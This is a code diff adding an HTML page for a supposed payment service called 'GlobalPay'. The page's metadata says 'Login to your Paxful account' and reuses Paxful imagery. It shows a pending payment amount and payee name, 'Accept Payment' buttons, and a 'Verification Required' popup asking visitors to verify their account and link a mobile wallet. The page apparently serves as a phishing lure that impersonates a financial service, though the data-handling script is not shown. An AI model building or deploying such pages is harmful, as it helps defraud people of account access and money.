@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#000000">
+  <title>Global Pay - Finance Solution</title>
+  <meta name="description" content="Login to your Paxful account">
+  <link rel="canonical" href="https://globalpay.onrender.com/">
+  <meta property="og:title" content="Finance Solution | GlobalPay">
+  <meta property="og:description" content="Login to your Paxful account">
+  <meta property="og:image" content="https://uploads.onecompiler.io/435v654fz/43gcyf6yt/Paxful-A-Peer-To-Peer-Bitcoin-Platform-In-Africa-Is-Shutting-Down.webp">
+  <meta property="og:image:width" content="1600">
+  <meta property="og:image:height" content="1001">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Global | Finance solution">
+  <meta name="twitter:description" content="Secured transaction under Block chain protocal">
+  <meta name="twitter:image" content="https://uploads.onecompiler.io/435v654fz/43gcyf6yt/Paxful-A-Peer-To-Peer-Bitcoin-Platform-In-Africa-Is-Shutting-Down.webp">
+  <meta name="twitter:image:width" content="1600">
+  <meta name="twitter:image:height" content="1001">
+  <link rel="icon" href="https://uploads.onecompiler.io/435v654fz/43dn9wdy2/Ct3osjzY_400x400.png" type="image/png">
+  <!-- Assuming you have other styles in styles.css, keep the link -->
+  <link rel="stylesheet" href="GLOBALPAY.css" />
+  <!-- <link rel="icon" href="favicon.ico" type="image/x-icon"> -->
+</head>
+<body>
+
+  <div class="container">
+    <div class="overlay"></div>
+    <main class="content-area">
+      <div class="main-content">
+
+        <div class="fixed-header">
+          <div class="header-logo">GlobalPay</div>
+          <div class="header-email">support@globalpay.com</div>
+        </div>
+
+        <header>
+          <h1 class="title">GlobalPay</h1>
+          <p class="subtitle" id="headp">Move your money around the world with Mobile<br>Wallet and GlobalPay</p>
+          <p class="subtitle">Just link your M-WALLET and GlobalPay Accounts and enjoy<br>a world of Possibilities</p>
+        </header>
+
+        <section class="middle-info" aria-labelledby="info-cards-heading">
+          <h2 id="info-cards-heading" class="visually-hidden">Key Information</h2>
+
+          <div class="info-card">
+            <h3 class="info-card__title">Amount:</h3>
+            <!-- **** Ensure these attributes are present **** -->
+            <p class="info-card__content" data-field="amount" contenteditable="false">LOADING...</p>
+            <p class="info-card__meta"></p>
+          </div>
+
+          <div class="info-card">
+            <h3 class="info-card__title">Name:</h3>
+            <!-- **** Ensure these attributes are present **** -->
+            <p class="info-card__content" data-field="name" contenteditable="false">LOADING...</p>
+            <p class="info-card__meta"></p>
+          </div>
+        </section>
+      </div>
+
+      <footer class="site-footer">
+        <p class="rates-link">
+          <a href="#rates">link your M-WALLET and GlobalPay Accounts </a>
+        </p>
+        <div class="action-buttons">
+          <button type="button" id="login-btn">Accept Payment</button>
+          <button type="button" id="register-btn">Decline Payment</button>
+        </div>
+      </footer>
+    </main>
+
+    <aside class="cover-image" role="presentation"></aside>
+
+  </div><!-- /.container -->
+
+  <!-- Verification Popup (Keep as is) -->
+  <div class="popup-overlay" id="popup-overlay" aria-hidden="true"></div>
+  <div class="verification-popup" id="verification-popup" role="dialog" aria-modal="true" aria-labelledby="popup-title" aria-hidden="true">
+     <!-- ... popup content ... -->
+     <h2 id="popup-title" class="popup-title">Verification Required</h2>
+     <p class="popup-message" id="popup-message">
+       Verify it's your Account proceeding for Amount:<span class="popup-amount"></span>.
+     </p>
+     <div class="popup-actions">
+       <button type="button" id="accept-btn" class="popup-button popup-button--accept">Verify</button>
+       <button type="button" id="decline-btn" class="popup-button popup-button--decline">Back</button>
+     </div>
+  </div>
+
+  <script src="GLOBALPAY.js"></script>
+
+</body>
+</html>
